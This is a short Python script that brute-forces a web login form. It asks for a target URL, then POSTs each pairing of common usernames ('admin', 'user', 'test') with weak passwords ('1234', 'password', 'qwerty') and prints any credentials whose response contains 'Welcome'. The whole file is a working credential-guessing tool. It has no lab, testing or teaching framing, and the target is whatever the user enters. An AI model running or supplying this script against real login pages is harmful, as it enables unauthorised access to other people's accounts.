import requests

# Get user input for the URL to send the POST requests to
url = input("Enter the URL for the login (default is 'http://example.com/login'): ") or 'http://example.com/login'

# Predefined lists of usernames and passwords to attempt
usernames = ['admin', 'user', 'test']
passwords = ['1234', 'password', 'qwerty']

# Iterate over each username
for username in usernames:
    # Iterate over each password
    for password in passwords:
        # Send a POST request with the current username and password
        response = requests.post(url, data={'username': username, 'password': password})
        
        # Check if the response contains the word 'Welcome', indicating a successful login
        if 'Welcome' in response.text:
            print(f'Found credentials: {username}:{password}')
            break  # Exit the inner loop if credentials are found